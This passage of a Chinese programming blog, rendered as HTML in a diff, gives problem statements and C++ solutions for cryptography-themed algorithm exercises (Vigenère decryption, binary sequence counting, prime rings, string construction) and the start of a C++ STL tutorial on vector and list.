&#125;</span><br><span class="line">        cout &lt;&lt; str[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="问题-B-Vigenere-密码"><a href="#问题-B-Vigenere-密码" class="headerlink" title="问题 B: Vigenère 密码"></a>问题 B: Vigenère 密码</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>16 世纪法国外交家 Blaise de Vigenère 设计了一种多表密码加密算法——Vigenère 密码。Vigenère 密码的加密解密算法简单易用，且破译难度比较高，曾在美国南北战争中为南军所广泛使用。</p>
+<p>在密码学中，我们称需要加密的信息为明文，用 MM 表示；称加密后的信息为密文，用 CC 表示；而密钥是一种参数，是将明文转换为密文或将密文转换为明文的算法中输入的数据，记为 kk。 在 Vigenère 密码中，密钥 kk 是一个字母串，k&#x3D;k1k2…kn。当明文 M &#x3D; m1m2…mn 时，得到的密文 C &#x3D; c1c2…cn ，其中 ci &#x3D; mi ®  ki，运算 ® 的规则如下表所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/20191016211706322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>Vigenère 加密在操作时需要注意：</p>
+<p>1 ® 运算忽略参与运算的字母的大小写，并保持字母在明文 MM 中的大小写形式；<br>2 当明文 MM 的长度大于密钥 kk 的长度时，将密钥 kk 重复使用。 例如，明文 M&#x3D;M&#x3D;Helloworld，密钥 k&#x3D;k&#x3D;abc时，密文 C&#x3D;C&#x3D;Hfnlpyosnd。<br><img src="https://img-blog.csdnimg.cn/20191016211749136.png"></p>
+<h2 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h2><p>第一行为一个字符串，表示密钥 kk，长度不超过 100100，其中仅包含大小写字母。</p>
+<p>第二行为一个字符串，表示经加密后的密文，长度不超过 10001000，其中仅包含大小写字母。</p>
+<h2 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h2><p>输出共 11 行，一个字符串，表示输入密钥和密文所对应的明文。</p>
+<h2 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h2><blockquote>
+<p>CompleteVictory<br>Yvqgpxaimmklongnzfwpvxmniytm</p>
+</blockquote>
+<h2 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h2><blockquote>
+<p>Wherethereisawillthereisaway</p>
+</blockquote>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>此题就是将输入的字符串传到string类型的变量str中，然后对数组进行操作即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text += &#x27;a&#x27; + (secretText[i] - &#x27;a&#x27; - Key[i % KeyLength] + &#x27;a&#x27; + 26) % 26;</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i, KeyLength, secretTextLength;</span><br><span class="line">    string Key, secretText, text;</span><br><span class="line">    cin &gt;&gt; Key;</span><br><span class="line">    cin &gt;&gt; secretText;</span><br><span class="line">    KeyLength = Key.length();</span><br><span class="line">    secretTextLength = secretText.length();</span><br><span class="line">    for(i = 0; i &lt; KeyLength; i++)     //k to all lowwer</span><br><span class="line">    &#123;</span><br><span class="line">        if(Key[i] &gt;= &#x27;A&#x27; &amp;&amp; Key[i] &lt;= &#x27;Z&#x27;)</span><br><span class="line">            Key[i] = Key[i] - &#x27;A&#x27; + &#x27;a&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = 0; i &lt; secretTextLength; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(secretText[i] &gt;= &#x27;A&#x27; &amp;&amp; secretText[i] &lt;= &#x27;Z&#x27;)</span><br><span class="line">            text += &#x27;A&#x27; + (secretText[i] - &#x27;A&#x27; - Key[i % KeyLength] + &#x27;a&#x27; + 26) % 26;</span><br><span class="line">        else</span><br><span class="line">            text += &#x27;a&#x27; + (secretText[i] - &#x27;a&#x27; - Key[i % KeyLength] + &#x27;a&#x27; + 26) % 26;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; text &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="问题-C-简单的密码"><a href="#问题-C-简单的密码" class="headerlink" title="问题 C: 简单的密码"></a>问题 C: 简单的密码</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>密码是按特定法则编成，用以对通信双方的信息进行明密变换的符号。密码是隐蔽了真实内容的符号序列。其实就是把用公开的、标准的信息编码表示的信息通过一种变换手段，将其变为除通信双方以外其他人所不能读懂的信息编码，这种独特的信息编码就是密码。<br>现在我们定义一种非常简单的密码，它的长度固定为n（n&lt;&#x3D;30）并且每一位只能由数字0或者数字1组成，但是有一个特殊的要求：一个密码序列中至少要有连续的3个0出现才可以，否则就是无效的。现在给定你密码序列的长度n，你的任务是计算长度为n的序列能产生多少种不同的并且有效的密码？</p>
+<h2 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h2><p>输入包含多组数据，每组数据只有一个正整数n（1&lt;&#x3D;n&lt;&#x3D;30）代表密码序列的长度，单独占一行。</p>
+<h2 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h2><p>对每组数据，输出一个整数，代表长度为n的序列能产生的不同密码的种类数。</p>
+<h2 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h2><blockquote>
+<p>4<br>5<br>6</p>
+</blockquote>
+<h2 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h2><blockquote>
+<p>3<br>8<br>20</p>
+</blockquote>
+<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>先给出递推式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[i] = 2 * f[i - 1] + (1 &lt;&lt; (i - 4)) - f[i - 4];</span><br></pre></td></tr></table></figure>
+
+<p>为什么呢？</p>
+<ol>
+<li>2*f[i-1]上一步如果已经有连续3个0了，那这一步可0可1；</li>
+<li>(1&lt;&lt;(i-4))-f[i-4]什么时候会有除上一种情况之外的解呢？答案是当上一步最后3位为100的时候，这三位（i-1位、i-2位、i-3位）已经定死了，那我们只要考虑到i-4位时不符合条件的数量，即总的减去符合条件的（2^(i-4)-f[i-4]）。</li>
+</ol>
+<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i, n;</span><br><span class="line">    int f[32] = &#123;0, 0, 0, 1&#125;;</span><br><span class="line">    while(~scanf(&quot;%d&quot;,&amp;n))</span><br><span class="line">    &#123;</span><br><span class="line">        for(i = 4; i &lt;= 30; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            f[i] = 2 * f[i - 1] + (1 &lt;&lt; (i - 4)) - f[i - 4];</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; f[n] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="问题-D-有趣的素数"><a href="#问题-D-有趣的素数" class="headerlink" title="问题 D: 有趣的素数"></a>问题 D: 有趣的素数</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>素数被广泛地应用于密码学中，所谓的公钥就是将想要传递的信息在编码时加入砠数，编码之后传给收信人，任何人收到此信息之后，若没有此收信人所拥有的秘钥，则在解密的过程中将会因为分解质因数过久而无法破解信息，可见素数在密码学中的重要性。<br>现在给你n（2&lt;&#x3D;n&lt;&#x3D;16）个正整数1,2,3…n，你的任务是把这n个正整数组成一个环，使得任意相邻的两个整数之和为一个素数，输出有多少种合法方案。</p>
+<h2 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h2><p>多组输入数据，每组数据只有一个正整数n（2&lt;&#x3D;n&lt;&#x3D;16）代表有n个正整数 1,2,3…n</p>
+<h2 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h2><p>对每组数据，输出一个整数，代表有多少种不同的可行方案数。</p>
+<h2 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h2><blockquote>
+<p>6<br>8</p>
+</blockquote>
+<h2 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h2><blockquote>
+<p>2<br>4</p>
+</blockquote>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于输入样例中的6，有以下2种合法方案（首尾相连构成一个环）</p>
+<p>1 4 3 2 5 6</p>
+<p>1 6 5 2 3 4</p>
+<p>对于输入样例中的8，有以下4种合法方案（首尾相连构成一个环）</p>
+<p>1 2 3 8 5 6 7 4</p>
+<p>1 2 5 8 3 4 7 6</p>
+<p>1 4 7 6 5 8 3 2</p>
+<p>1 6 7 4 3 8 5 2</p>
+<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>当层数等于n时跳出（往回走，即回溯） 判断下首尾加起来是不是素数，若是，则ans++; 否则什么也不做。<br>中间约束剪枝就是判断当前和前面一个加起来是不是素数，不是的话就直接剪。<br>普通的素数判定方法可能会TLE，所以判断素数最好打个表。原问题n最大是16，所以打30多的表就够了（16＋15&#x3D;&#x3D;31）。</p>
+<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int n, ans, last;</span><br><span class="line">bool visited[32];</span><br><span class="line">bool isPrime[40]=&#123;0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void pc(int cur);</span><br><span class="line">    while(~scanf(&quot;%d&quot;,&amp;n))</span><br><span class="line">    &#123;</span><br><span class="line">        memset(visited, 0, sizeof(visited));</span><br><span class="line">        ans = 0;</span><br><span class="line">        last = 1;</span><br><span class="line">        pc(1);</span><br><span class="line">        cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void pc(int cur)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    if(cur == n &amp;&amp; isPrime[1 + last])</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = 2; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!visited[i] &amp;&amp; isPrime[last + i])</span><br><span class="line">        &#123;</span><br><span class="line">            int t = last;</span><br><span class="line">            last = i;</span><br><span class="line">            visited[i] = true;</span><br><span class="line">            pc(cur + 1);</span><br><span class="line">            visited[i] = false;</span><br><span class="line">            last = t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="问题-E-数据加密"><a href="#问题-E-数据加密" class="headerlink" title="问题 E: 数据加密"></a>问题 E: 数据加密</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>密码学是研究编制密码和破译密码的技术科学。研究密码变化的客观规律，应用于编制密码以保守通信秘密的，称为编码学；应用于破译密码以获取通信情报的，称为破译学，总称密码学。密码是通信双方按约定的法则进行信息特殊变换的一种重要保密手段。依照这些法则，变明文为密文，称为加密变换；变密文为明文，称为脱密变换。密码在早期仅对文字或数码进行加、脱密变换，随着通信技术的发展，对语音、图像、数据等都可实施加、脱密变换。<br>现在要求你用下面给定的方法对数据实现加密。给定长度为n的字符串S（1&lt;&#x3D;n&lt;&#x3D;2000,S中只有大写字母）作为明文，要求构造一个字符串T作为密文，起初T是一个空串，之后反复执行以下任意操作</p>
+<p>1.从S的头部删除一个字符，加入到T的尾部<br>2.从S的尾部删除一个字符，加入到T的尾部</p>
+<p>最后S会变成空串，T会变成一个长度为n的字符串作为密文。当然并非所有的构造方案都是符合条件的，我们要求构造出的密文T的字典序尽可能小，你能找出这个字典序最小的密文吗？</p>
+<h2 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h2><p>输入包含多组数据，每组数据占两行，第一行为一个整数n（1&lt;&#x3D;n&lt;&#x3D;2000）代表字符串S的长度，第二行为一个长度为n的字符串S代表明文，保证S中只有大写字母</p>
+<h2 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h2><p>对每组数据，输出一行字符串，代表构造出的字典序最小的密文T</p>
+<h2 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h2><blockquote>
+<p>6<br>ACDBCB</p>
+</blockquote>
+<h2 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h2><blockquote>
+<p>ABCBCD</p>
+</blockquote>
+<h2 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h2><p>字典序是指从前往后比较两个字符串大小的方法。首先比较第1个字符，如果不同则第1个字符更小的字符串更小，如果相同则继续比较第2个字符……如此继续，来比较整个字符串的大小</p>
+<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>当头和尾不等的时候好选，关键就是头和尾一样怎么办？<br>仔细想想，容易发现，假设头指针为i，尾指针为j，如果相同，则比较i+1和j-1，如果再相同，继续下去……<br>我们可以写个循环，如果相同继续比较，不同就跳出。头小flag置为true，否则置为false。<br>其实T字符串根本不用存，直接输出即可。</p>
+<h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n, k;</span><br><span class="line">    char str[2005], ans[2005];</span><br><span class="line">    while(~scanf(&quot;%d&quot;, &amp;n))</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; str;</span><br><span class="line">        int i = 0, j = n - 1;</span><br><span class="line">        while(i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            bool flag = false;</span><br><span class="line">            for(k = 0; i + k &lt; j - k; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(str[i + k] &lt; str[j - k])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag = true;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(str[i + k] &gt; str[j - k])</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">            if(flag)</span><br><span class="line">                cout &lt;&lt; str[i++];</span><br><span class="line">            else</span><br><span class="line">                cout &lt;&lt; str[j--];</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本文参考了下面大佬的文章<br><a target="_blank" rel="noopener" href="https://comydream.github.io/2018/10/20/algorithm-meets-crypt/">https://comydream.github.io/2018/10/20/algorithm-meets-crypt/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/16/CUMTOJ%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/" data-id="cl1qb1dxl001vqktu15b3h9wg" data-title="CUMTOJ算法实验作业" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-C++标准模板库（Standard Template Library,STL）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/15/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93%EF%BC%88Standard%20Template%20Library,STL%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2019-10-15T09:07:34.000Z" itemprop="datePublished">2019-10-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Cpp/">Cpp</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/15/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93%EF%BC%88Standard%20Template%20Library,STL%EF%BC%89/">C++标准模板库（Standard Template Library,STL）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>下周数据结构实验就要开始考试了，所以总结一点C++的标准模板库来学习，希望下周考试能轻松度过<br>(〃’▽’〃)(〃’▽’〃)(〃’▽’〃)</p>
+<h1 id="1-什么是标准模板库（STL）？"><a href="#1-什么是标准模板库（STL）？" class="headerlink" title="1 什么是标准模板库（STL）？"></a>1 什么是标准模板库（STL）？</h1><h2 id="1-1-C-标准模板库与C-标准库的关系"><a href="#1-1-C-标准模板库与C-标准库的关系" class="headerlink" title="1.1 C++标准模板库与C++标准库的关系"></a>1.1 C++标准模板库与C++标准库的关系</h2><p>C++标准模板库其实属于C++标准库的一部分，C++标准模板库主要是定义了标准模板的定义与声明，而这些模板主要都是类模板，我们可以调用这些模板来定义一个具体的类；与之前的自己手动创建一个函数模版或者是类模板不一样，我们使用STL就不用自己来创建模板了，这些模板都定义在标准模板库中，我们只需要学会怎么使用这些类模板来定义一个具体的类，然后能够使用类提供的各种方法来处理数据。</p>
+<h2 id="1-2-STL六大组件"><a href="#1-2-STL六大组件" class="headerlink" title="1.2 STL六大组件"></a>1.2 STL六大组件</h2><p>容器（containers）、算法（algorithms）、迭代器（iterators）、函数对象（functors）、适配器（adapters）、分配器（allocators）</p>
+<h1 id="2-容器分类"><a href="#2-容器分类" class="headerlink" title="2 容器分类"></a>2 容器分类</h1><p>STL对定义的通用容器分三类：顺序性容器、关联式容器和容器适配器。</p>
+<ul>
+<li>顺序性容器：vector、deque、list</li>
+<li>关联性容器：set、multiset、map、multimap</li>
+<li>容器适配器：stack、queue</li>
+</ul>
+<h2 id="2-1-vector-容器"><a href="#2-1-vector-容器" class="headerlink" title="2.1 vector 容器"></a>2.1 vector 容器</h2><p>vector向量是一种顺序性容器。相当于数组，但其大小可以不预先指定，并且自动扩展。它可以像数组一样被操作，由于它的特性我们完全可以将vector 看作动态数组。</p>
+<p>在创建一个vector后，它会自动在内存中分配一块连续的内存空间进行数据存储，初始的空间大小可以预先指定也可以由vector 默认指定。当存储的数据超过分配的空间时，vector会重新分配一块内存块，但这样的分配是很耗时的，在重新分配空间时它会做这样的动作：</p>
+<ul>
+<li>首先，vector 会申请一块更大的内存块；</li>
+<li>然后，将原来的数据拷贝到新的内存块中；</li>
+<li>其次，销毁掉原内存块中的对象（调用对象的析构函数）；</li>
+<li>最后，将原来的内存空间释放掉。</li>
+</ul>
+<p>当vector保存的数据量很大时，如果此时进行插入数据导致需要更大的空间来存放这些数据量，那么将会大大的影响程序运行的效率，所以我们应该合理的使用vector。</p>
+<h3 id="2-1-1-初始化vector对象的方式："><a href="#2-1-1-初始化vector对象的方式：" class="headerlink" title="2.1.1 初始化vector对象的方式："></a>2.1.1 初始化vector对象的方式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;T&gt; v1;         // 默认的初始化方式，内容为空</span><br><span class="line">vector&lt;T&gt; v2(v1);     // v2是v1的一个副本</span><br><span class="line">vector&lt;T&gt; v3(n, i)    // v3中包含了n个数值为i的元素</span><br><span class="line">vector&lt;T&gt; v4(n);      // v4中包含了n个元素，每个元素的值都是0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-2-vector常用函数"><a href="#2-1-2-vector常用函数" class="headerlink" title="2.1.2 vector常用函数"></a>2.1.2 vector常用函数</h3><blockquote>
+<p>empty()：判断向量是否为空，为空返回真，否则为假<br>begin()：返回向量（数组）的首元素地址<br>end()： 返回向量（数组）的末元素的下一个元素的地址<br>clear()：清空向量<br>front()：返回得到向量的第一个元素的数据<br>back()：返回得到向量的最后一个元素的数据<br>size()：返回得到向量中元素的个数<br>push_back(数据)：将数据插入到向量的尾部<br>pop_back()：删除向量尾部的数据</p>
+</blockquote>
+<h3 id="2-1-3-遍历方式"><a href="#2-1-3-遍历方式" class="headerlink" title="2.1.3 遍历方式"></a>2.1.3 遍历方式</h3><p>vector向量支持两种方式遍历，因为可以认为vector是一种动态数组，所以可以使用数组下标的方式，也可以使用迭代器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; vec;</span><br><span class="line"></span><br><span class="line">    vec.push_back(1);</span><br><span class="line">    vec.push_back(2);</span><br><span class="line">    vec.push_back(3);</span><br><span class="line">    vec.push_back(4);</span><br><span class="line">    vec.push_back(5);</span><br><span class="line">	</span><br><span class="line">    cout &lt;&lt; &quot;向量的大小：&quot; &lt;&lt; vec.size() &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    // 数组下标方式遍历vector</span><br><span class="line">    for (int i = 0; i &lt; vec.size(); i++)</span><br><span class="line">        cout &lt;&lt; vec[i] &lt;&lt; &quot; &quot;;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    // 迭代器方式遍历vector</span><br><span class="line">    vector&lt;int&gt;::iterator itor = vec.begin();</span><br><span class="line">    for (; itor != vec.end(); itor++)</span><br><span class="line">        cout &lt;&lt; *itor &lt;&lt; &quot; &quot;;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<p><img src="https://img-blog.csdnimg.cn/20191015200355618.png"></p>
+<h2 id="2-2-双向链表list"><a href="#2-2-双向链表list" class="headerlink" title="2.2 双向链表list"></a>2.2 双向链表list</h2><p>学过数据结构的同学都知道，对于一个双向链表来说主要包括3个元素：</p>
+<ul>
+<li>指向前一个链表节点的前向指针</li>
+<li>有效数据</li>
+<li>指向后一个链表节点的后向指针</li>
+</ul>
+<p>链表相对于vector向量来说的优点在于：</p>
+<p>(1)动态的分配内存，当需要添加数据的时候不会像vector那样，先将现有的内存空间释放，再次分配更大的空间，这样的话效率就比较低了。<br>(2)支持内部插入、头部插入和尾部插入</p>
+<p>缺点：不能随机访问，不支持[]方式和vector.at()、占用的内存会多于vector（非有效数据占用的内存空间）</p>
+<h3 id="2-2-1-初始化list对象的方式："><a href="#2-2-1-初始化list对象的方式：" class="headerlink" title="2.2.1 初始化list对象的方式："></a>2.2.1 初始化list对象的方式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">list&lt;int&gt; L0;                         //空链表</span><br><span class="line">list&lt;int&gt; L1(3);                      //建一个含三个默认值是0的元素的链表</span><br><span class="line">list&lt;int&gt; L2(5, 2);                    //建一个含五个元素的链表，值都是2</span><br><span class="line">list&lt;int&gt; L3(L2);                     //L3是L2的副本</span><br><span class="line">list&lt;int&gt; L4(L1.begin(), L1.end());    //L4含L1一个区域的元素[begin, end]。</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-2-list常用函数"><a href="#2-2-2-list常用函数" class="headerlink" title="2.2.2 list常用函数"></a>2.2.2 list常用函数</h3><blockquote>
+<p>begin()：返回list容器的第一个元素的地址<br>end()：返回list容器的最后一个元素之后的地址<br>rbegin()：返回逆向链表的第一个元素的地址（也就是最后一个元素的地址）<br>rend()：返回逆向链表的最后一个元素之后的地址（也就是第一个元素再往前的位置）<br>front()：返回链表中第一个数据值<br>back()：返回链表中最后一个数据值<br>empty()：判断链表是否为空<br>size()：返回链表容器的元素个数<br>clear()：清除容器中所有元素<br>insert(pos, num)：将数据num插入到pos位置处（pos是一个地址）<br>insert(pos, n, num)：在pos位置处插入n个元素num<br>erase(pos)：删除pos位置处的元素<br>push_back(num)：在链表尾部插入数据num<br>pop_back()：删除链表尾部的元素<br>push_front(num)：在链表头部插入数据num<br>pop_front()：删除链表头部的元素<br>sort()：将链表排序，默认升序<br>……</p>
+</blockquote>
